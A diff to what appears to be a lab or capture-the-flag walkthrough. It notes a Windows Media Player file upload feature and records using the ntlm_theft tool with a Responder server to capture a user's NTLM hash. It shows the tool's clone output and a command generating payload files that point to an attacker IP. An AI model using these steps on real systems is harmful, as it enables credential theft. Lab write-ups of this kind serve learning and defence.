@@ -63,12 +63,14 @@ Content-Type: text/html; charset=UTF-8
 
 ```
 
+scrolling at the bottom of the page there is a file upload feature that allows to upload windows media player compatible files:
 
+![](./screens/1.png)
 
 ---
 ## Foothold
 
-How you gained initial access to the machine.
+The file upload reference the responder server allowing to capture the ntlm hash of an user. (find article that explains and reference)
 
 ### Vulnerability
 
@@ -76,6 +78,7 @@ Description of the vulnerability exploited.
 
 ### Exploitation
 
+poc used: https://github.com/Greenwolf/ntlm_theft.git 
 
 ```shell
 git clone https://github.com/Greenwolf/ntlm_theft.git           
@@ -88,6 +91,8 @@ Receiving objects: 100% (179/179), 2.13 MiB | 3.18 MiB/s, done.
 Resolving deltas: 100% (90/90), done.
                                                                  
 ```
+
+Generating the payloads:
 
 ```
 python3 ntlm_theft.py -g all -s 10.10.15.80 -f test
